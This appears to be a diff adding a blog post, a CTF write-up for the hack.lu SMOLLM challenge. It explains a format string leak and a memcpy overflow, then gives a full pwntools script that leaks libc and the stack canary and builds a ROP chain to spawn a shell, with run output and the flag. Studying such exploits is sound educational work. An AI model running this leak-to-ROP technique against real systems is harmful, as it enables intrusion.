@@ -1,0 +1,251 @@
+---
+title: 'hackluctf SMOLLM'
+description: 'format string leak to rop'
+date: 2025-10-19
+tags: ['pwn', 'ctf']
+image: './ikea.jpg'
+authors: ['jp']
+---
+
+# Background Information
+
+Hi, it's been a minute since I've wrote a writeup or anything. Anyways, I had some free time during break to play CTF, and this week it was hack.lu ctf by Flux Fingers! I played with PPP. 
+
+## SMOLLM
+
+So we are given a binary, source, and libc. First thing to do is just skim over the code and find any low-hanging fruit.
+
+We run `checksec` and find out the binary in pretty well protected:
+
+```bash
+File:     /home/jake/hackluctf/SMOLLM/smollm
+Arch:     amd64
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+RUNPATH:    b'.'
+SHSTK:      Enabled
+IBT:        Enabled
+Stripped:   No
+```
+
+The basic overview of the program is:
+
+1. Add custom tokens
+2. Write something small and have the program print out tokens
+
+### Format String
+
+So first off, there is a format string vulnerability in `run_prompt`: 
+
+```c
+void run_prompt() {
+    int n;
+    static unsigned int combinator = 0;
+    char in_buf[256], out_buf[256];
+    bzero(in_buf, sizeof(in_buf));
+    bzero(out_buf, sizeof(in_buf));
+
+    printf("How can I help you?\n>");
+    n = read(STDIN_FILENO, in_buf, sizeof(in_buf));
+    if (n <= 0) {
+        printf("Read error\n");
+        exit(-1);
+    }
+    for (int i = 0; i < n; i++) {
+        memcpy(&out_buf[i*TOKEN_SIZE], tokens[(in_buf[i] + combinator++) % n_tokens], TOKEN_SIZE);
+    }
+    printf(out_buf); //printf vulnerability in this code
+    printf("\n");
+}
+```
+
+Essentially, we can leak values in the stack since the printf doesn't have a specifier. We can leverage this to leak libc, pie, canary, stack, etc.
+
+### memcpy bug
+
+There is also another bug in `run_prompt` where memcpy can copy a buffer much larger than out_buf, causing an overflow:
+
+```c
+printf("How can I help you?\n>");
+n = read(STDIN_FILENO, in_buf, sizeof(in_buf));
+if (n <= 0) {
+    printf("Read error\n");
+    exit(-1);
+}
+for (int i = 0; i < n; i++) {
+    memcpy(&out_buf[i*TOKEN_SIZE], tokens[(in_buf[i] + combinator++) % n_tokens], TOKEN_SIZE);
+}
+```
+
+`out_buf` is only 256 bytes, however we can add in custom tokens, which when copied over by `in_buf[i] + combinator++` would allow us to write past the `out_buf` and gain control flow. However, do note that the specific tokesn that are copied relies on the mod of the number of tokens, so we do have to calculate what specific characters to use to trigger our custom tokens to be used rather than the system's.
+
+We can use this to "ROP" or reuse instructions when controlling RIP to gain control flow, although I used libc gadgets because the program was missing essential instructions like `pop rdi`.
+
+### Exploitation
+
+So with this knowledge, we have a pretty simple process of exploitation:
+
+1. Add `%p` format string specifiers as tokens to leak out pointers in the stack
+2. Calculate a specific prompt so that `printf(out_buf)` will print out the `%p` tokens
+3. Collect info leaks, particularly canary and libc
+4. Calculate the libc addresses for system(), /bin/sh, pop rdi, and ret
+5. Use the token functionality to add back a ROP chain as custom tokens
+6. Calculate a prompt payload so that our rop chain gets copied
+7. Enjoy the shell!
+
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context.arch = 'amd64'
+# Set the log level to debug to see all the I/O
+context.log_level = 'info' # Change to 'debug' for more verbosity
+
+elf = ELF('./smollm_patched')
+libc = ELF('./libc.so.6')
+
+if 'REMOTE' in args:
+    r = remote('SMOLLM.flu.xxx', 1024)
+else:
+    r = process(elf.path)
+
+if 'GDB' in args:
+    gdb.attach(r, """
+    b *main+274
+    continue
+""")
+
+# --- Add a single token for our leak ---
+
+leak_token = b'%p'*3
+r.sendlineafter(b'>', b'1')
+r.sendlineafter(b'token?>', leak_token)
+
+# --- Craft a trigger string to leak the maximum "safe" number of values ---
+# out_buf is 256 bytes, TOKEN_SIZE is 8. Max tokens = 256 / 8 = 32.
+num_leaks = 32
+target_index = 106
+n_tokens = 107
+trigger_string = b""
+for i in range(num_leaks):
+    char_code = (target_index - i) % n_tokens
+    trigger_string += bytes([char_code])
+# --- Run the prompt and trigger the leak ---
+r.sendlineafter(b'>', b'2')
+r.sendlineafter(b'>', trigger_string)
+leak_output = r.recvuntil(b'Do you want to')
+
+leaks = leak_output.split(b'0x')
+leaks = [(b'0x'+i).strip() for i in leaks if not i.isspace()]
+
+libc.address = int(leaks[leaks.index(b'0x1(nil)')+1], 16) - 8650 - 0x28000
+log.info("libc base address: " + hex(libc.address))
+
+leaks = [(i).replace(b'(nil)', b' ').replace(b'.', b' ').strip() for i in leaks]
+canary = next((addr for addr in leaks if (addr.endswith(b'00'))), None)
+canary = int(canary, 16)
+log.info("canary value: " + hex(canary))
+
+rop = ROP([libc])
+pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+system = libc.symbols['system']
+bin_sh = libc.search(b'/bin/sh').__next__()
+
+
+log.info("ret address: " + hex(ret))
+log.info("pop rdi address: " + hex(pop_rdi))
+log.info("system address: " + hex(system))
+log.info("bin sh address: " + hex(bin_sh))
+
+
+# fill in the out_buf buffer?
+for i in range(4):
+    r.sendlineafter(b'>', b'1')
+    r.sendafter(b'>', b'A'*8)
+
+# place canary
+r.sendlineafter(b'>', b'1')
+r.sendafter(b'>', p64(canary))
+
+# place padding?
+r.sendlineafter(b'>', b'1')
+r.sendafter(b'>', b'A'*8)
+
+r.sendlineafter(b'>', b'1')
+r.sendafter(b'>', p64(ret))
+
+#pop rdi
+r.sendlineafter(b'>', b'1')
+r.sendafter(b'>', p64(pop_rdi))
+
+# place binsh
+r.sendlineafter(b'>', b'1')
+r.sendafter(b'>', p64(bin_sh))
+
+# place system
+r.sendlineafter(b'>', b'1')
+r.sendafter(b'>', p64(system))
+
+r.sendlineafter(b'>', b'2')
+
+total_tokens_needed = 32 + 10  # Adjust based on actual stack layout
+
+rop_trigger = b""
+combinator_offset = 32
+n_tokens = 118+1  # 107 + 11
+for i in range(total_tokens_needed):
+    target_token = 107 + (i % 10)  # Cycle through your ROP tokens
+    char_code = (target_token - combinator_offset - i) % n_tokens
+    rop_trigger += bytes([char_code])
+
+r.sendafter(b'>', rop_trigger)
+
+r.interactive()
+```
+
+And... we get flag:
+
+```bash
+jake@LAPTOP-5K5LHSPO:~/hackluctf/SMOLLM$ python3 solve.py REMOTE
+[*] '/home/jake/hackluctf/SMOLLM/smollm_patched'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b'.'
+[*] '/home/jake/hackluctf/SMOLLM/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to SMOLLM.flu.xxx on port 1024: Done
+[*] libc base address: 0x76935a2ca000
+[*] canary value: 0xf8a3c5ee8929bf00
+[*] Loaded 111 cached gadgets for './libc.so.6'
+[*] ret address: 0x76935a2f282f
+[*] pop rdi address: 0x76935a3d978b
+[*] system address: 0x76935a322750
+[*] bin sh address: 0x76935a49542f
+[*] Switching to interactive mode
+AAAAAAAAAAAAAAAAAAAAAAAA
+$ ls
+flag
+ld-linux-x86-64.so.2
+libc.so.6
+smollm
+ynetd
+$ cat flag
+flag{w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c}
+$  
+```
+
+`flag{w3_4re_ou7_0f_7ok3n5,sorry:171cec579a6ccf7ab7eba1b8cd2ee12c}`
+
+# Conclusion
+
+A bit of a fun break from homework and studying! Hopefully this sparks some kind of ctf lock in, especially during my time in PPP... 
